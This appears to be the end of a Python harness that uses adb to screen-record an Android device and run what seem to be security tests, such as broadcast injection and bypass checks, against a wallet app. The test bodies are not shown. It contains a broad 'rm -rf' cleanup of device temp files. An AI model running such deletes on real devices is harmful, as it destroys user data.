        # full 170s — suspects: /data pressure from --no-streaming staging leaks and
        # the old encoder still holding MediaCodec after only a 5s settle. Fix: disk
        # headroom log + trim-caches, 10s settle, retry on EMPTY (not just timeout),
        # surface screenrecord's own error text, sweep staged tmp on miss.
        df = sh("adb shell df /data | tail -2", 30)
        log(f"DISK before rec: {df.strip()[:180]}")
        sh("adb shell pm trim-caches 1G || true", 90)
        for i in range(1, 29):
            sh("adb shell pkill -INT screenrecord || true", 25)
            time.sleep(10)
            ok = False
            out = ""
            sz = "0"
            for att in range(2):
                r = sh(f'adb shell "screenrecord --time-limit 170 --bit-rate 6000000 '
                       f'/sdcard/rec{i}.mp4"', 220)
                if r == "TIMEOUT":
                    log(f"rec{i}: adb hung -> force rotate (attempt {att + 1})")
                    sh("adb shell pkill -INT screenrecord || true", 25)
                    sh(f"adb shell rm -f /sdcard/rec{i}.mp4", 25)
                    time.sleep(10)
                    continue
                out = r.strip()
                sz = sh(f"adb shell stat -c %s /sdcard/rec{i}.mp4 2>/dev/null || echo 0", 30).strip()
                if sz and sz != "0":
                    ok = True
                    break
                log(f"rec{i}: empty (attempt {att + 1}) screenrecord={out[:130]}")
                sh("adb shell rm -rf /data/local/tmp/* 2>/dev/null || true", 30)
                sh(f"adb shell rm -f /sdcard/rec{i}.mp4", 25)
                time.sleep(5)
            if out and not ok:
                log(f"rec{i}: screenrecord said: {out[:150]}")
            log(f"rec{i}: ok={ok} size={sz[:20]}")
            time.sleep(3)
        log("recording finished (28 segments attempted)")
    threading.Thread(target=rec_worker, daemon=True).start()
    log("recording started (28x170s, watchdog rotation)")

    for tfn in (t12_broadcast_injection, t1_control_risk, t1_bypass, t2_swap_prefill,
                t3_siblings, t4_browser, t9_popup_chain, t6_rn_modules,
                t5_lock, t7_negatives):
        ensure_wallet_fg(tfn.__name__)
        tfn()

    sh("adb logcat -d > /tmp/ult/logcat.txt 2>&1", 180)
    sh("adb shell wm size > /tmp/ult/size.txt 2>&1", 30)
    log("=== ult_drive finished ===")

if __name__ == "__main__":
    main()
